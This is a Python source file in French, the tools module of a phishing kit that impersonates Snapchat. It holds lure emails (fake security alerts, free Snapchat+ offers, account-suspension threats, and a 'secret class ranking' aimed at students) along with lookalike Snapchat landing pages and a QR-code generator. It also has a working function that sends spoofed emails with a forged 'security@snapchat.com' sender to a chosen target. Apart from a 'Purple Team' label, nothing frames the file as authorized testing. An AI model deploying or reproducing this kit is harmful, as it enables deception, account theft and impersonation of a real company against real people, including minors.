"""
╔══════════════════════════════════════════════════════════════╗
║  Phishing Kit — Outils complémentaires                      ║
║  Usage: python3 -c "from tools import *; menu_tools()"      ║
╚══════════════════════════════════════════════════════════════╝
"""
import os, sys, json, time, smtplib, socket, webbrowser
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

BASE = os.path.dirname(os.path.abspath(__file__))
SCENARIOS_DIR = os.path.join(BASE, "templates", "scenarios")
QR_DIR = os.path.join(BASE, "static", "qr")
CONFIG_FILE = os.path.join(BASE, "config", "tools_config.json")

# ── Colors ──
try:
    from colorama import init, Fore, Style
    init()
    R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN
    M = Fore.MAGENTA; B = Fore.BLUE; W = Fore.WHITE; X = Style.RESET_ALL; D = Style.DIM
except:
    class _F:
        def __getattr__(self, n): return ''
    Fore = _F(); Style = _F()
    R=G=Y=C=M=B=W=X=D=''

# ══════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════

DEFAULT_CONFIG = {
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587,
    "smtp_username": "",
    "smtp_password": "",
    "sender_name": "Snapchat Security",
    "sender_email": "security@snapchat.com",
    "target_email": "",
    "campaign_url": "http://localhost:8080",
    "active_scenario": "classement",
}

def load_config():
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE) as f:
                return json.load(f)
    except: pass
    return dict(DEFAULT_CONFIG)

def save_config(cfg):
    os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f, indent=2)

# ══════════════════════════════════════════════════════════════
#  SCÉNARIOS D'APPÂTS
# ══════════════════════════════════════════════════════════════

SCENARIOS = {
    "classement": {
        "nom": "🏆 Classement Secret",
        "desc": "Jeu de vote anonyme pour la classe",
        "fichier": "bait.html",
        "template": "bait.html",
        "email_subject": "Qui est le plus populaire de ta classe ?",
        "email_body": """Salut !

Un classement secret a été lancé dans ta classe. 
Vote anonymement pour tes camarades et découvre les résultats !

👉 {URL}

Ton vote reste 100% anonyme. 
Une seule participation par personne.

À toi de jouer ! 🏆"""
    },
    "securite": {
        "nom": "🔐 Alerte de Sécurité",
        "desc": "Fausse alerte de connexion suspecte",
        "fichier": "scenario_securite.html",
        "template": None,
        "email_subject": "🔴 Alerte de sécurité — Nouvelle connexion détectée",
        "email_body": """Bonjour,

Nous avons détecté une tentative de connexion à votre compte Snapchat depuis un nouvel appareil :

📍 Localisation : Paris, France
🕐 Date : {DATE}
💻 Appareil : iPhone 15 Pro

Si vous n'êtes pas à l'origine de cette connexion, sécurisez votre compte immédiatement :

👉 {URL}

Équipe Snapchat Sécurité"""
    },
    "concours": {
        "nom": "🎁 Snapchat+ Gratuit",
        "desc": "Faux concours Snapchat Premium",
        "fichier": "scenario_concours.html",
        "template": None,
        "email_subject": "🎉 Vous avez gagné Snapchat+ !",
        "email_body": """Félicitations !

Vous avez été sélectionné pour recevoir Snapchat+ GRATUITEMENT pendant 3 mois.

🎁 Snapchat+ inclus :
⭐ Badge exclusif
👁️ Voir qui visite votre profil
💬 Replay illimité
🔥 Et bien plus encore !

Activation limitée : {URL}

Cette offre expire dans 24h.
L'équipe Snapchat"""
    },
    "verification": {
        "nom": "✅ Vérification Requise",
        "desc": "Fausse demande de vérification de compte",
        "fichier": "scenario_verification.html",
        "template": None,
        "email_subject": "⚠️ Action requise : vérifiez votre compte",
        "email_body": """Cher utilisateur,

Suite à une mise à jour de nos conditions d'utilisation, nous vous demandons de vérifier votre compte Snapchat pour éviter toute suspension.

🔒 Vérifier mon compte : {URL}

Cette procédure prend moins de 2 minutes.
Passé ce délai, votre compte pourrait être temporairement désactivé.

Merci de votre compréhension,
L'équipe Snapchat"""
    },
    "cadeau": {
        "nom": "🎀 Cadeau Mystère",
        "desc": "Faux cadeau surprise Snapchat",
        "fichier": "scenario_cadeau.html",
        "template": None,
        "email_subject": "🎀 Surprise ! Vous avez un cadeau Snapchat",
        "email_body": """Quelqu'un vous a envoyé un cadeau mystère sur Snapchat ! 🎀

Pour découvrir ce que c'est, connectez-vous et réclamez votre surprise :

🎁 {URL}

⚠️ Ce lien est personnel et expire dans 48h.

Tu veux savoir ce que c'est ? Clique vite !"""
    }
}

def get_scenario_html(nom):
    """Génère le HTML d'un scénario."""
    s = SCENARIOS.get(nom, SCENARIOS["classement"])
    url = load_config().get("campaign_url", "http://localhost:8080")

    if nom == "classement":
        return None  # Already handled by bait.html

    templates = {
        "securite": f"""<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Alerte de sécurité · Snapchat</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;700&display=swap" rel="stylesheet"/>
<style>
body {{ margin:0; min-height:100vh; background:#ffb2bd; background-image:radial-gradient(#b80049 10%,transparent 11%),radial-gradient(#b80049 10%,transparent 11%); background-size:40px 40px; background-position:0 0,20px 20px; font-family:'Plus Jakarta Sans',sans-serif; display:flex; align-items:center; justify-content:center; padding:20px; }}
.card {{ background:rgba(255,255,255,0.9); backdrop-filter:blur(20px); border:4px solid #000; border-radius:24px; padding:32px 24px; max-width:400px; width:100%; text-align:center; box-shadow:10px 10px 0 0 #000; }}
.icon {{ font-size:56px; margin-bottom:12px; }}
h1 {{ font-family:'Outfit',sans-serif; font-size:24px; font-weight:800; margin:0 0 8px; color:#1a1c1c; }}
.sub {{ font-size:14px; color:#5c3f43; margin-bottom:20px; line-height:1.5; }}
.alert {{ background:#ffd9de; border:3px solid #ba1a1a; border-radius:12px; padding:14px; margin-bottom:20px; text-align:left; font-size:13px; line-height:1.6; }}
.alert strong {{ color:#ba1a1a; }}
.detail {{ display:flex; justify-content:space-between; padding:6px 0; font-size:13px; border-bottom:1px solid #eee; }}
.detail span:first-child {{ color:#888; }}
.btn {{ display:block; width:100%; padding:14px; border:3px solid #000; border-radius:12px; font-size:16px; font-weight:700; cursor:pointer; margin-top:16px; background:#FFFC00; color:#000; box-shadow:4px 4px 0 0 #000; transition:all 0.1s; text-decoration:none; font-family:'Outfit',sans-serif; box-sizing:border-box; }}
.btn:active {{ transform:translate(2px,2px); box-shadow:2px 2px 0 0 #000; }}
.footer {{ font-size:11px; color:#aaa; margin-top:16px; }}
</style>
</head><body>
<div class="card">
<div class="icon">👻</div>
<h1>Alerte de sécurité</h1>
<p class="sub">Une nouvelle connexion a été détectée sur votre compte</p>
<div class="alert">
<strong>🔴 Connexion suspecte</strong><br/>
Nous avons détecté une tentative de connexion depuis un appareil inconnu.
</div>
<div class="detail"><span>Localisation</span><span>Paris, France 🇫🇷</span></div>
<div class="detail"><span>Date</span><span>{datetime.now().strftime('%d/%m/%Y %H:%M')}</span></div>
<div class="detail"><span>Appareil</span><span>iPhone 15 Pro</span></div>
<div class="detail"><span>Statut</span><span style="color:#ba1a1a;font-weight:700;">Non reconnu</span></div>
<a href="{url}" class="btn">🔒 Sécuriser mon compte</a>
<p class="footer">Si vous reconnaissez cette connexion, ignorez ce message.</p>
</div>
</body></html>""",

        "concours": f"""<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Snapchat+ · Concours</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;700&display=swap" rel="stylesheet"/>
<style>
body {{ margin:0; min-height:100vh; background:#ffb2bd; background-image:radial-gradient(#b80049 10%,transparent 11%),radial-gradient(#b80049 10%,transparent 11%); background-size:40px 40px; background-position:0 0,20px 20px; font-family:'Plus Jakarta Sans',sans-serif; display:flex; align-items:center; justify-content:center; padding:20px; }}
.card {{ background:rgba(255,255,255,0.9); backdrop-filter:blur(20px); border:4px solid #000; border-radius:24px; padding:32px 24px; max-width:400px; width:100%; text-align:center; box-shadow:10px 10px 0 0 #000; }}
.icon {{ font-size:56px; margin-bottom:12px; }}
h1 {{ font-family:'Outfit',sans-serif; font-size:24px; font-weight:800; margin:0 0 8px; color:#1a1c1c; }}
.sub {{ font-size:14px; color:#5c3f43; margin-bottom:20px; }}
.badge {{ display:inline-block; background:#FFD700; border:2px solid #000; border-radius:20px; padding:4px 14px; font-size:12px; font-weight:700; margin-bottom:16px; box-shadow:2px 2px 0 0 #000; }}
.perk {{ display:flex; align-items:center; gap:10px; padding:10px 14px; background:#f4f4f4; border:2px solid #000; border-radius:10px; margin-bottom:8px; text-align:left; font-size:13px; box-shadow:2px 2px 0 0 #000; }}
.perk .emoji {{ font-size:20px; }}
.btn {{ display:block; width:100%; padding:14px; border:3px solid #000; border-radius:12px; font-size:16px; font-weight:700; cursor:pointer; margin-top:16px; background:#FFFC00; color:#000; box-shadow:4px 4px 0 0 #000; transition:all 0.1s; text-decoration:none; font-family:'Outfit',sans-serif; box-sizing:border-box; }}
.btn:active {{ transform:translate(2px,2px); box-shadow:2px 2px 0 0 #000; }}
.timer {{ font-size:12px; color:#ba1a1a; font-weight:700; margin-top:12px; }}
</style>
</head><body>
<div class="card">
<div class="icon">🎉</div>
<div class="badge">OFFRE LIMITÉE</div>
<h1>Snapchat+ Gratuit</h1>
<p class="sub">Vous avez été sélectionné pour 3 mois offerts !</p>
<div class="perk"><span class="emoji">⭐</span> Badge Snapchat+ exclusif</div>
<div class="perk"><span class="emoji">👁️</span> Voir qui visite votre profil</div>
<div class="perk"><span class="emoji">💬</span> Replay illimité des snaps</div>
<div class="perk"><span class="emoji">🔥</span> Snapstreak Boost</div>
<a href="{url}" class="btn">🎁 Activer mon Snapchat+</a>
<p class="timer">⏳ Offre expire dans 24h</p>
</div>
</body></html>""",

        "cadeau": f"""<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Surprise · Snapchat</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;700&display=swap" rel="stylesheet"/>
<style>
body {{ margin:0; min-height:100vh; background:#ffb2bd; background-image:radial-gradient(#b80049 10%,transparent 11%),radial-gradient(#b80049 10%,transparent 11%); background-size:40px 40px; background-position:0 0,20px 20px; font-family:'Plus Jakarta Sans',sans-serif; display:flex; align-items:center; justify-content:center; padding:20px; }}
.card {{ background:rgba(255,255,255,0.9); backdrop-filter:blur(20px); border:4px solid #000; border-radius:24px; padding:32px 24px; max-width:400px; width:100%; text-align:center; box-shadow:10px 10px 0 0 #000; }}
.icon {{ font-size:56px; margin-bottom:12px; }}
h1 {{ font-family:'Outfit',sans-serif; font-size:24px; font-weight:800; margin:0 0 8px; color:#1a1c1c; }}
.sub {{ font-size:14px; color:#5c3f43; margin-bottom:20px; line-height:1.5; }}
.gift-box {{ width:120px; height:120px; margin:0 auto 20px; background:linear-gradient(135deg,#FF3366,#FF8C00); border:4px solid #000; border-radius:20px; display:flex; align-items:center; justify-content:center; font-size:48px; box-shadow:6px 6px 0 0 #000; animation:bounce 2s infinite; }}
@keyframes bounce {{ 0%,100% {{ transform:translateY(0); }} 50% {{ transform:translateY(-8px); }} }}
.btn {{ display:block; width:100%; padding:14px; border:3px solid #000; border-radius:12px; font-size:16px; font-weight:700; cursor:pointer; margin-top:16px; background:#FFFC00; color:#000; box-shadow:4px 4px 0 0 #000; transition:all 0.1s; text-decoration:none; font-family:'Outfit',sans-serif; box-sizing:border-box; }}
.btn:active {{ transform:translate(2px,2px); box-shadow:2px 2px 0 0 #000; }}
.info {{ font-size:12px; color:#888; margin-top:14px; }}
</style>
</head><body>
<div class="card">
<div class="gift-box">🎀</div>
<h1>Surprise ! Un cadeau pour toi</h1>
<p class="sub">Quelqu'un t'a envoyé un cadeau mystère.</p>
<a href="{url}" class="btn">🎁 Voir mon cadeau</a>
<p class="info">Ce lien est personnel · Expire dans 48h</p>
</div>
</body></html>""",

        "verification": f"""<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Vérification · Snapchat</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;700&display=swap" rel="stylesheet"/>
<style>
body {{ margin:0; min-height:100vh; background:#ffb2bd; background-image:radial-gradient(#b80049 10%,transparent 11%),radial-gradient(#b80049 10%,transparent 11%); background-size:40px 40px; background-position:0 0,20px 20px; font-family:'Plus Jakarta Sans',sans-serif; display:flex; align-items:center; justify-content:center; padding:20px; }}
.card {{ background:rgba(255,255,255,0.9); backdrop-filter:blur(20px); border:4px solid #000; border-radius:24px; padding:32px 24px; max-width:400px; width:100%; text-align:center; box-shadow:10px 10px 0 0 #000; }}
.icon {{ font-size:56px; margin-bottom:12px; }}
h1 {{ font-family:'Outfit',sans-serif; font-size:24px; font-weight:800; margin:0 0 8px; color:#1a1c1c; }}
.sub {{ font-size:14px; color:#5c3f43; margin-bottom:20px; line-height:1.5; }}
.warning {{ background:#fff3cd; border:3px solid #ffc107; border-radius:12px; padding:14px; margin-bottom:20px; font-size:13px; text-align:left; }}
.warning strong {{ color:#856404; }}
.btn {{ display:block; width:100%; padding:14px; border:3px solid #000; border-radius:12px; font-size:16px; font-weight:700; cursor:pointer; margin-top:16px; background:#FFFC00; color:#000; box-shadow:4px 4px 0 0 #000; transition:all 0.1s; text-decoration:none; font-family:'Outfit',sans-serif; box-sizing:border-box; }}
.btn:active {{ transform:translate(2px,2px); box-shadow:2px 2px 0 0 #000; }}
.urgent {{ font-size:11px; color:#ba1a1a; font-weight:700; margin-top:12px; }}
</style>
</head><body>
<div class="card">
<div class="icon">👻</div>
<h1>Vérification requise</h1>
<p class="sub">Nous avons mis à jour nos conditions d'utilisation.</p>
<div class="warning">
<strong>⚠️ Action requise</strong><br/>
Veuillez vérifier votre compte pour éviter toute suspension.
</div>
<a href="{url}" class="btn">✅ Vérifier mon compte</a>
<p class="urgent">⏳ 48h restantes avant suspension</p>
</div>
</body></html>""",
    }
    return templates.get(nom)

def install_scenario(nom):
    """Installe un scénario comme page d'accueil."""
    html = get_scenario_html(nom)
    if nom == "classement":
        # bait.html already exists
        return "bait.html"
    if html:
        path = os.path.join(BASE, "templates", SCENARIOS[nom]["fichier"])
        with open(path, "w") as f:
            f.write(html)
        # Update main.py route to serve this template
        return SCENARIOS[nom]["fichier"]

def list_scenarios():
    """Affiche les scénarios disponibles."""
    print(f"\n  {C}Scénarios d'appâts disponibles :{X}\n")
    for key, s in SCENARIOS.items():
        actif = " ← ACTIF" if load_config().get("active_scenario") == key else ""
        print(f"    {W}[{key}]{X} {s['nom']} — {s['desc']}{G}{actif}{X}")
    print()

# ══════════════════════════════════════════════════════════════
#  QR CODE
# ══════════════════════════════════════════════════════════════

def generate_qr(data, filename="campaign_qr.png"):
    """Génère un QR code PNG."""
    try:
        import qrcode
        os.makedirs(QR_DIR, exist_ok=True)
        path = os.path.join(QR_DIR, filename)
        img = qrcode.make(data)
        img.save(path)
        print(f"  {G}✓ QR code généré : {path}{X}")
        return path
    except ImportError:
        print(f"  {R}✗ Module qrcode non installé. Fais : pip install qrcode{pillow}{X}")
        return None

def serve_qr_page():
    """Crée une page HTML qui affiche le QR code."""
    path = os.path.join(QR_DIR, "campaign_qr.png")
    if not os.path.exists(path):
        print(f"  {R}✗ Aucun QR code trouvé. Génère-le d'abord.{X}")
        return False

    import base64
    with open(path, "rb") as f:
        b64 = base64.b64encode(f.read()).decode()

    html = f"""<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>QR Code · Campagne</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;700&display=swap" rel="stylesheet"/>
<style>
body {{ margin:0; min-height:100vh; background:#ffb2bd; font-family:'Plus Jakarta Sans',sans-serif; display:flex; align-items:center; justify-content:center; padding:20px; }}
.card {{ background:rgba(255,255,255,0.9); backdrop-filter:blur(20px); border:4px solid #000; border-radius:24px; padding:32px; max-width:360px; width:100%; text-align:center; box-shadow:10px 10px 0 0 #000; }}
h1 {{ font-family:'Outfit',sans-serif; font-size:22px; font-weight:800; margin:0 0 8px; }}
p {{ font-size:14px; color:#5c3f43; margin:0 0 20px; }}
.qr {{ width:250px; height:250px; margin:0 auto; border:4px solid #000; border-radius:16px; overflow:hidden; box-shadow:4px 4px 0 0 #000; }}
.qr img {{ width:100%; height:100%; object-fit:contain; }}
.url {{ font-size:11px; color:#888; margin-top:16px; word-break:break-all; }}
</style>
</head><body>
<div class="card">
<h1>📸 Scanne le QR code</h1>
<p>Pour accéder à la campagne</p>
<div class="qr"><img src="data:image/png;base64,{b64}" alt="QR Code"/></div>
<p class="url">{load_config().get('campaign_url', 'http://localhost:8080')}</p>
</div>
</body></html>"""

    qr_page = os.path.join(BASE, "templates", "qr_page.html")
    with open(qr_page, "w") as f:
        f.write(html)
    print(f"  {G}✓ Page QR créée : /qr_page{X}")
    print(f"  {D}  Ouvre http://localhost:8080/qr_page pour voir le QR code{X}")
    return True

# ══════════════════════════════════════════════════════════════
#  EMAIL SPOOFING
# ══════════════════════════════════════════════════════════════

def send_spoof_email(config=None):
    """Envoie un email spoofé."""
    if config is None:
        config = load_config()

    if not config.get("smtp_username") or not config.get("smtp_password"):
        print(f"\n  {R}✗ SMTP non configuré. Configure d'abord un serveur SMTP.{X}")
        return False

    scenario = SCENARIOS.get(config["active_scenario"], SCENARIOS["classement"])
    subject = scenario["email_subject"]
    body = scenario["email_body"].format(
        URL=config["campaign_url"],
        DATE=datetime.now().strftime("%d/%m/%Y à %H:%M")
    )

    msg = MIMEMultipart("alternative")
    msg["From"] = f"{config['sender_name']} <{config['sender_email']}>"
    msg["To"] = config["target_email"]
    msg["Subject"] = subject

    # Version texte
    msg.attach(MIMEText(body, "plain", "utf-8"))
    # Version HTML
    html_body = body.replace("\n", "<br>")
    msg.attach(MIMEText(
        f"<div style='font-family:sans-serif;padding:20px;max-width:600px;margin:0 auto;'>{html_body}</div>",
        "html", "utf-8"
    ))

    try:
        print(f"\n  {Y}Envoi de l'email...{X}")
        print(f"  {D}De: {config['sender_name']} <{config['sender_email']}>{X}")
        print(f"  {D}À: {config['target_email']}{X}")
        print(f"  {D}Sujet: {subject}{X}")
        print(f"  {D}Serveur: {config['smtp_server']}:{config['smtp_port']}{X}")

        server = smtplib.SMTP(config["smtp_server"], config["smtp_port"])
        server.starttls()
        server.login(config["smtp_username"], config["smtp_password"])
        server.sendmail(config["sender_email"], [config["target_email"]], msg.as_string())
        server.quit()

        print(f"  {G}✓ Email envoyé avec succès !{X}")
        return True
    except smtplib.SMTPAuthenticationError:
        print(f"  {R}✗ Authentification SMTP échouée. Vérifie ton mot de passe.{X}")
        print(f"  {Y}  Pour Gmail, utilise un mot de passe d'application (pas ton mot de passe normal).{X}")
        return False
    except Exception as e:
        print(f"  {R}✗ Erreur d'envoi : {e}{X}")
        return False

# ══════════════════════════════════════════════════════════════
#  INTERFACE MENU
# ══════════════════════════════════════════════════════════════

def cls():
    os.system("cls" if os.name == "nt" else "clear")

def configure_smtp():
    cfg = load_config()
    cls()
    print(f"\n  {C}╔══════════════════════════════════════════╗{X}")
    print(f"  {C}║        CONFIGURATION SMTP              ║{X}")
    print(f"  {C}╚══════════════════════════════════════════╝{X}")
    print(f"\n  {Y}Pour Gmail, utilise un mot de passe d'application (généré depuis le compte Google).{X}")
    print()
    cfg["smtp_server"] = input(f"  {C}Serveur SMTP{X} (défaut: smtp.gmail.com) : ").strip() or "smtp.gmail.com"
    cfg["smtp_port"] = int(input(f"  {C}Port{X} (défaut: 587) : ").strip() or "587")
    cfg["smtp_username"] = input(f"  {C}Nom d'utilisateur{X} : ").strip()
    cfg["smtp_password"] = input(f"  {C}Mot de passe{X} : ").strip()
    cfg["sender_name"] = input(f"  {C}Nom de l'expéditeur{X} (défaut: Snapchat Security) : ").strip() or "Snapchat Security"
    cfg["sender_email"] = input(f"  {C}Email de l'expéditeur{X} (défaut: security@snapchat.com) : ").strip() or "security@snapchat.com"
    save_config(cfg)
    print(f"\n  {G}✓ Configuration SMTP sauvegardée.{X}")
    input(f"\n  {D}[Appuie sur Entrée]{X}")

def configure_target():
    cfg = load_config()
    cls()
    print(f"\n  {C}╔══════════════════════════════════════════╗{X}")
    print(f"  {C}║        CONFIGURATION CIBLE              ║{X}")
    print(f"  {C}╚══════════════════════════════════════════╝{X}")
    print()
    cfg["target_email"] = input(f"  {C}Email de la cible{X} : ").strip()
    cfg["campaign_url"] = input(f"  {C}URL de la campagne{X} (défaut: {cfg['campaign_url']}) : ").strip() or cfg["campaign_url"]
    save_config(cfg)
    print(f"\n  {G}✓ Cible configurée.{X}")
    input(f"\n  {D}[Appuie sur Entrée]{X}")

def choose_scenario():
    cfg = load_config()
    cls()
    print(f"\n  {C}╔══════════════════════════════════════════╗{X}")
    print(f"  {C}║        CHOIX DU SCÉNARIO                ║{X}")
    print(f"  {C}╚══════════════════════════════════════════╝{X}")
    list_scenarios()
    print(f"  {D}Scénario actif : {cfg.get('active_scenario', 'classement')}{X}")
    print()
    choix = input(f"  {G}Nom du scénario >{X} ").strip().lower()
    if choix in SCENARIOS:
        cfg["active_scenario"] = choix
        save_config(cfg)
        # Installer le template
        f = install_scenario(choix)
        print(f"\n  {G}✓ Scénario activé : {SCENARIOS[choix]['nom']}{X}")
        if choix != "classement":
            print(f"  {Y}  ⚠️  Tu dois modifier la route / dans main.py pour servir {f}{X}")
            print(f"  {Y}  Ou utilise le bouton [7] pour l'activer automatiquement.{X}")
    else:
        print(f"  {R}✗ Scénario inconnu.{X}")
    input(f"\n  {D}[Appuie sur Entrée]{X}")

def do_generate_qr():
    cfg = load_config()
    url = cfg["campaign_url"]
    cls()
    print(f"\n  {C}╔══════════════════════════════════════════╗{X}")
    print(f"  {C}║        GÉNÉRATION QR CODE               ║{X}")
    print(f"  {C}╚══════════════════════════════════════════╝{X}")
    print(f"\n  URL : {url}")
    path = generate_qr(url)
    if path:
        serve_qr_page()
    input(f"\n  {D}[Appuie sur Entrée]{X}")

def do_send_email():
    cfg = load_config()
    cls()
    print(f"\n  {C}╔══════════════════════════════════════════╗{X}")
    print(f"  {C}║        ENVOI D'EMAIL SPOOFÉ             ║{X}")
    print(f"  {C}╚══════════════════════════════════════════╝{X}")
    print(f"\n  Scénario : {SCENARIOS.get(cfg['active_scenario'], {}).get('nom', 'Inconnu')}")
    print(f"  Cible : {cfg['target_email'] or 'Non configurée'}")
    print(f"  URL : {cfg['campaign_url']}")
    print()
    if not cfg.get("target_email"):
        print(f"  {R}✗ Aucune cible configurée.{X}")
        input(f"\n  {D}[Appuie sur Entrée]{X}")
        return
    if not cfg.get("smtp_username") or not cfg.get("smtp_password"):
        print(f"  {Y}⚠️  SMTP non configuré.{X}")
        conf = input(f"  Configurer maintenant ? (o/n) : ").strip().lower()
        if conf == "o":
            configure_smtp()
            cfg = load_config()
        else:
            input(f"\n  {D}[Appuie sur Entrée]{X}")
            return
    send_spoof_email(cfg)
    input(f"\n  {D}[Appuie sur Entrée]{X}")

def show_status():
    cfg = load_config()
    cls()
    print(f"\n  {C}╔══════════════════════════════════════════╗{X}")
    print(f"  {C}║        ÉTAT DE LA CAMPAGNE             ║{X}")
    print(f"  {C}╚══════════════════════════════════════════╝{X}")
    print(f"\n  📧 Cible        : {cfg['target_email'] or 'Non configurée'}")
    print(f"  🎯 Scénario     : {SCENARIOS.get(cfg['active_scenario'], {}).get('nom', 'Inconnu')}")
    print(f"  🔗 URL          : {cfg['campaign_url']}")
    print(f"  📤 SMTP         : {'✅ Configuré' if cfg.get('smtp_username') else '❌ Non configuré'}")
    print(f"  🖼️  QR code     : {'✅ Existe' if os.path.exists(os.path.join(QR_DIR, 'campaign_qr.png')) else '❌ Pas généré'}")
    print(f"  🏠 Serveur      : {'✅ En ligne' if is_port_open(8080) else '❌ Hors ligne'}")
    print()
    input(f"  {D}[Appuie sur Entrée]{X}")

def is_port_open(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.settimeout(1)
        s.connect(("127.0.0.1", port))
        return True
    except: return False
    finally: s.close()

def menu_tools():
    """Menu principal des outils."""
    while True:
        cls()
        print(f"""
{Y}   ███████╗███╗   ███╗     ███████╗███╗   ██╗ ██████╗ {X}
{Y}   ██╔════╝████╗ ████║     ██╔════╝████╗  ██║██╔════╝ {X}
{Y}   █████╗  ██╔████╔██║     ███████╗██╔██╗ ██║██║  ███╗{X}
{Y}   ██╔══╝  ██║╚██╔╝██║     ╚════██║██║╚██╗██║██║   ██║{X}
{Y}   ██║     ██║ ╚═╝ ██║     ███████║██║ ╚████║╚██████╔╝{X}
{Y}   ╚═╝     ╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝ {X}
""")
        print(f"  {D}{'─' * 58}{X}")
        print(f"  {C}  OUTILS PHISHING KIT — Purple Team      {X}")
        print(f"  {D}{'─' * 58}{X}")
        print()
        print(f"  {C}═ ÉTAPE 1 — PRÉPARATION ═{X}")
        print(f"    {W}[1]{X}  Configurer le serveur SMTP")
        print(f"    {W}[2]{X}  Configurer la cible (email + URL)")
        print(f"    {W}[3]{X}  Choisir le scénario d'appât")
        print(f"    {W}[4]{X}  Générer le QR code")
        print()
        print(f"  {C}═ ÉTAPE 2 — LANCEMENT ═{X}")
        print(f"    {W}[5]{X}  Envoyer l'email spoofé")
        print(f"    {W}[6]{X}  Démarrer le serveur")
        print(f"    {W}[7]{X}  Activer le scénario sur le serveur")
        print()
        print(f"  {C}═ ÉTAPE 3 — SUIVI ═{X}")
        print(f"    {W}[8]{X}  État de la campagne")
        print(f"    {W}[9]{X}  Dashboard + Watch Live")
        print()
        print(f"  {D}[0]{X}  Retour")
        print()
        choix = input(f"  {G}└─>{X} ").strip()

        if choix == "1": configure_smtp()
        elif choix == "2": configure_target()
        elif choix == "3": choose_scenario()
        elif choix == "4": do_generate_qr()
        elif choix == "5": do_send_email()
        elif choix == "6":
            print(f"\n  {Y}Lance le serveur depuis le menu principal avec [1]{X}")
            input(f"\n  {D}[Appuie sur Entrée]{X}")
        elif choix == "7":
            print(f"\n  {Y}Le scénario sera actif au prochain démarrage du serveur.{X}")
            print(f"  {D}  Scénario actif : {SCENARIOS.get(load_config().get('active_scenario'), {}).get('nom')}{X}")
            input(f"\n  {D}[Appuie sur Entrée]{X}")
        elif choix == "8": show_status()
        elif choix == "9":
            print(f"\n  {Y}Utilise le menu principal → [3] Dashboard ou [4] Watch Live{X}")
            input(f"\n  {D}[Appuie sur Entrée]{X}")
        elif choix == "0": break

if __name__ == "__main__":
    menu_tools()
